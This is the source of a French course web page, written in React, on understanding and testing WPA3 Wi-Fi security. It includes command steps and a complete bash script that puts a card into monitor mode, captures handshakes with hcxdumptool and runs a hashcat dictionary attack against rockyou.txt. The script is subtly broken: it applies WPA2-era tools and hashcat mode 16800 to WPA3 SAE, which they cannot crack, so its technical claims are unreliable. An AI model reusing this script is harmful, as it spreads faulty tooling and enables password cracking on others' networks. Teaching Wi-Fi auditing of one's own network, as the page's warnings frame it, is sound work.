
'use client';

import { CourseLayout } from "@/components/CourseLayout";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Shield, Lock, Zap, Info, CheckCircle2, XCircle, AlertTriangle, Terminal } from "lucide-react";
import { Button } from "@/components/ui/button";
import Link from "next/link";

export default function WPA3Page() {
  return (
    <CourseLayout title="Comprendre et Tester WPA3">
      <div className="space-y-8">
        {/* Avertissement */}
        <Alert className="border-yellow-600 bg-yellow-50 dark:bg-yellow-950">
          <AlertTriangle className="h-4 w-4 text-yellow-600" />
          <AlertDescription className="text-yellow-800 dark:text-yellow-200">
            <strong>Avertissement légal :</strong> Ce cours traite du test de sécurité sur 
            vos propres réseaux UNIQUEMENT. Tester la sécurité de réseaux auxquels vous 
            n'appartenez pas est ILLÉGAL.
          </AlertDescription>
        </Alert>

        {/* Introduction */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold flex items-center gap-2">
            <Shield className="h-8 w-8 text-primary" />
            Introduction à WPA3
          </h2>
          
          <p className="text-lg text-muted-foreground">
            WPA3 est la dernière génération de sécurité Wi-Fi, introduite en 2018. 
            Il apporte des améliorations significatives par rapport à WPA2 et corrige 
            plusieurs vulnérabilités connues.
          </p>

          <Alert>
            <Info className="h-4 w-4" />
            <AlertDescription>
              <strong>Point clé :</strong> WPA3 rend les attaques par dictionnaire 
              beaucoup plus difficiles à exécuter, grâce à un protocole d'authentification 
              plus robuste appelé SAE.
            </AlertDescription>
          </Alert>
        </section>

        {/* Fonctionnement WPA3 */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold flex items-center gap-2">
            <Lock className="h-8 w-8 text-primary" />
            Fonctionnement de WPA3
          </h2>

          <Card>
            <CardHeader>
              <CardTitle>SAE (Simultaneous Authentication of Equals)</CardTitle>
              <CardDescription>Le protocole d'authentification de WPA3</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <p className="text-sm text-muted-foreground">
                WPA3 remplace le 4-way handshake de WPA2 par SAE (aussi appelé Dragonfly), 
                un protocole d'échange de clés beaucoup plus sécurisé.
              </p>

              <div className="bg-muted p-4 rounded-lg space-y-2 text-sm">
                <p><strong>Différences clés :</strong></p>
                <ul className="list-disc list-inside space-y-2">
                  <li><CheckCircle2 className="inline h-4 w-4 text-green-600 mr-2" />WPA2 : Vulnérable aux attaques par dictionnaire hors ligne</li>
                  <li><CheckCircle2 className="inline h-4 w-4 text-green-600 mr-2" />WPA3 : Ajoute une protection contre les attaques hors ligne</li>
                  <li><CheckCircle2 className="inline h-4 w-4 text-green-600 mr-2" />SAE protège contre les attaques par force brute</li>
                </ul>
              </div>
            </CardContent>
          </Card>
        </section>

        {/* Processus de Test */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold flex items-center gap-2">
            <Zap className="h-8 w-8 text-primary" />
            Processus de Test de Sécurité WPA3
          </h2>

          <p className="text-muted-foreground">
            Voici les étapes pour tester la sécurité WPA3 sur votre propre réseau :
          </p>

          {/* Étape 1 */}
          <Card>
            <CardHeader>
              <CardTitle className="text-lg">1. Configuration de l'Interface</CardTitle>
              <CardDescription>Détection et préparation de l'interface Wi-Fi</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <p className="text-sm">
                La première étape consiste à identifier votre interface Wi-Fi et la passer 
                en mode monitor, qui permet de capturer le trafic sans être connecté.
              </p>
              <div className="bg-muted p-3 rounded text-sm font-mono">
                <p>$ iwconfig</p>
                <p>$ sudo airmon-ng start wlan0</p>
              </div>
            </CardContent>
          </Card>

          {/* Étape 2 */}
          <Card>
            <CardHeader>
              <CardTitle className="text-lg">2. Identification du Réseau Cible</CardTitle>
              <CardDescription>Localiser le BSSID et le canal du réseau</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <p className="text-sm">
                Vous devez identifier le BSSID (adresse MAC du routeur) et le canal Wi-Fi 
                utilisé par votre réseau WPA3. Cela permet à hcxdumptool de se concentrer 
                sur le bon réseau.
              </p>
              <div className="bg-muted p-3 rounded text-sm font-mono">
                <p className="text-muted-foreground"># Affiche le BSSID connecté</p>
                <p>$ iwconfig wlan0 | grep "Access Point"</p>
              </div>
            </CardContent>
          </Card>

          {/* Étape 3 */}
          <Card>
            <CardHeader>
              <CardTitle className="text-lg">3. Installation des Outils</CardTitle>
              <CardDescription>Les outils nécessaires pour la capture et le craquage</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <div className="space-y-2 text-sm">
                <div className="flex items-start gap-2">
                  <CheckCircle2 className="h-4 w-4 text-green-600 mt-0.5 flex-shrink-0" />
                  <div>
                    <strong>hcxdumptool</strong> : Capture les handshakes WPA3 de manière 
                    efficace et minimise les traces
                  </div>
                </div>
                <div className="flex items-start gap-2">
                  <CheckCircle2 className="h-4 w-4 text-green-600 mt-0.5 flex-shrink-0" />
                  <div>
                    <strong>hcxpcaptohccapx</strong> : Convertit les fichiers capture au 
                    format compatible avec hashcat
                  </div>
                </div>
                <div className="flex items-start gap-2">
                  <CheckCircle2 className="h-4 w-4 text-green-600 mt-0.5 flex-shrink-0" />
                  <div>
                    <strong>hashcat</strong> : Utilise la puissance GPU pour tenter de 
                    cracker les mots de passe
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Étape 4 */}
          <Card>
            <CardHeader>
              <CardTitle className="text-lg">4. Capture du Handshake</CardTitle>
              <CardDescription>Enregistrement des données d'authentification</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <p className="text-sm">
                hcxdumptool capture le handshake SAE lors de la connexion d'un appareil 
                au réseau Wi-Fi. C'est cette information qui sera utilisée pour le test.
              </p>
              <Alert>
                <Info className="h-4 w-4" />
                <AlertDescription>
                  Pour capturer un handshake, vous devez attendre qu'un appareil se connecte, 
                  ou vous pouvez forcer une reconnexion.
                </AlertDescription>
              </Alert>
            </CardContent>
          </Card>

          {/* Étape 5 */}
          <Card>
            <CardHeader>
              <CardTitle className="text-lg">5. Test de Robustesse du Mot de Passe</CardTitle>
              <CardDescription>Évaluation de la complexité du mot de passe</CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <p className="text-sm">
                Avec WPA3, même si vous capturez le handshake, le craquage est beaucoup 
                plus difficile. hcxpcaptohccapx et hashcat peuvent tenter une attaque 
                par dictionnaire, mais :
              </p>
              <div className="bg-red-50 dark:bg-red-950 p-3 rounded text-sm border border-red-200 dark:border-red-800">
                <p className="text-red-800 dark:text-red-200">
                  ⚠️ WPA3 protège contre les attaques hors ligne. Même avec un mot de passe 
                  faible, le protocole SAE rend le craquage très lent ou impossible.
                </p>
              </div>
            </CardContent>
          </Card>
        </section>

        {/* Script de Test WPA3 */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold flex items-center gap-2">
            <Terminal className="h-8 w-8 text-primary" />
            Script Automatisé pour WPA3
          </h2>

          <Card>
            <CardHeader>
              <CardTitle>Script bash pour tester WPA3</CardTitle>
              <CardDescription>Automatisation complète du processus de test</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <Alert>
                <AlertTriangle className="h-4 w-4" />
                <AlertDescription>
                  <strong>Avertissement :</strong> Ce script est uniquement pour tester vos propres réseaux. 
                  L'utilisation sur des réseaux non autorisés est illégale.
                </AlertDescription>
              </Alert>

              <div className="space-y-3">
                <h4 className="font-semibold">1. Créer le script</h4>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div className="text-muted-foreground"># Créer le fichier script</div>
                  <div>nano wpa3_test.sh</div>
                </div>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold">2. Contenu du script</h4>
                <div className="bg-muted p-4 rounded-lg">
                  <pre className="text-xs whitespace-pre-wrap">
{`#!/bin/bash

# Script pour tester la sécurité WPA3

# Fonction pour détecter l'interface Wi-Fi
detect_interface() {
    echo "Recherche de l'interface Wi-Fi..."
    INTERFACE=$(iwconfig 2>/dev/null | grep "IEEE 802.11" | awk '{print $1}' | head -n1)
    if [ -z "$INTERFACE" ]; then
        echo "Erreur : aucune interface Wi-Fi détectée."
        exit 1
    else
        echo "Interface détectée : $INTERFACE"
    fi
}

# Installation automatique des outils
install_tools() {
    echo "Vérification des outils..."
    for tool in hcxdumptool hcxpcaptohccapx hashcat; do
        if ! command -v $tool &>/dev/null; then
            echo "Installation de $tool..."
            sudo apt-get update -qq
            sudo apt-get install -y $tool
        fi
    done
}

# Début du script
detect_interface
install_tools

# Arrêt NetworkManager
echo "Arrêt de NetworkManager..."
sudo systemctl stop NetworkManager

# Mode monitor
echo "Activation du mode monitor..."
sudo airmon-ng start "$INTERFACE"
MONITOR_IFACE="\${INTERFACE}mon"

# Choix du BSSID
echo "Choisissez le mode de sélection du réseau :"
select choix in "Manuel" "Automatique"; do
    case $choix in
        "Manuel")
            read -p "BSSID (00:11:22:33:44:55): " BSSID
            break
            ;;
        "Automatique")
            BSSID=$(iwconfig "$INTERFACE" | grep "Access Point" | awk '{print $6}')
            echo "BSSID détecté : $BSSID"
            break
            ;;
    esac
done

# Canal
read -p "Canal du réseau (ex: 6): " CHANNEL
CHANNEL=\${CHANNEL:-6}

# Capture avec hcxdumptool
echo "Démarrage de la capture WPA3..."
sudo hcxdumptool -i "$MONITOR_IFACE" -B "$BSSID" -o capture.pcapng --enable_status=1 --channel "$CHANNEL"

# Conversion pour hashcat
echo "Conversion du fichier..."
hcxpcaptohccapx capture.pcapng -o capture.hccapx

# Dictionnaire
read -p "Dictionnaire personnalisé ? (o/n): " use_custom
if [ "$use_custom" = "o" ]; then
    read -p "Chemin du dictionnaire: " DIC
else
    DIC="/usr/share/wordlists/rockyou.txt"
fi

# Test avec hashcat
echo "Test de robustesse du mot de passe..."
hashcat -m 16800 capture.hccapx "$DIC"

# Nettoyage
sudo airmon-ng stop "$MONITOR_IFACE"
sudo systemctl start NetworkManager
echo "Test terminé."`}
                  </pre>
                </div>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold">3. Rendre le script exécutable</h4>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div>chmod +x wpa3_test.sh</div>
                </div>
              </div>

              <div className="space-y-3">
                <h4 className="font-semibold">4. Exécuter le script</h4>
                <div className="bg-muted p-4 rounded-lg font-mono text-sm space-y-2">
                  <div>sudo ./wpa3_test.sh</div>
                </div>
              </div>

              <Alert>
                <Info className="h-4 w-4" />
                <AlertDescription>
                  <strong>Note importante :</strong> Contrairement à WPA2, le craquage WPA3 est 
                  extrêmement difficile même avec des mots de passe faibles. Ce script sert 
                  principalement à comprendre le processus et tester la robustesse de votre réseau.
                </AlertDescription>
              </Alert>
            </CardContent>
          </Card>
        </section>

        {/* Avantages de WPA3 */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold flex items-center gap-2">
            <CheckCircle2 className="h-8 w-8 text-green-600" />
            Améliorations de Sécurité WPA3
          </h2>

          <div className="grid gap-4">
            <Card>
              <CardHeader>
                <CardTitle className="text-base">Protection hors ligne</CardTitle>
              </CardHeader>
              <CardContent className="text-sm text-muted-foreground">
                SAE rend les attaques par dictionnaire hors ligne extrêmement coûteuses en termes 
                de calcul, contrairement à WPA2.
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-base">Individualized Data Encryption (OWE)</CardTitle>
              </CardHeader>
              <CardContent className="text-sm text-muted-foreground">
                Chiffrement du trafic même sur les réseaux ouverts, protégeant les données 
                sensibles.
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-base">Protection contre les réseaux faibles</CardTitle>
              </CardHeader>
              <CardContent className="text-sm text-muted-foreground">
                Même avec un réseau 2.4 GHz moins sécurisé, WPA3 maintient une protection 
                forte.
              </CardContent>
            </Card>
          </div>
        </section>

        {/* Recommandations */}
        <section className="space-y-4">
          <h2 className="text-3xl font-bold flex items-center gap-2">
            <Shield className="h-8 w-8 text-primary" />
            Bonnes Pratiques de Sécurité WPA3
          </h2>

          <div className="bg-blue-50 dark:bg-blue-950 p-4 rounded-lg border border-blue-200 dark:border-blue-800 space-y-3 text-sm">
            <p className="font-semibold text-blue-900 dark:text-blue-100">Pour maximiser la sécurité :</p>
            <ul className="list-disc list-inside space-y-2 text-blue-800 dark:text-blue-200">
              <li>Utilisez un mot de passe long (16+ caractères)</li>
              <li>Mélangez majuscules, minuscules, chiffres et caractères spéciaux</li>
              <li>Mettez à jour le firmware de votre routeur régulièrement</li>
              <li>Activez WPA3 si votre routeur le supporte</li>
              <li>Testez régulièrement la sécurité de votre propre réseau</li>
            </ul>
          </div>
        </section>

        {/* Navigation */}
        <div className="flex justify-between pt-8 border-t">
          <Button asChild variant="outline">
            <Link href="/courses/wpa2-cracking">
              ← Précédent : Cracker WPA2
            </Link>
          </Button>
          <Button asChild>
            <Link href="/courses/exercises">
              Suivant : Exercices pratiques →
            </Link>
          </Button>
        </div>
      </div>
    </CourseLayout>
  );
}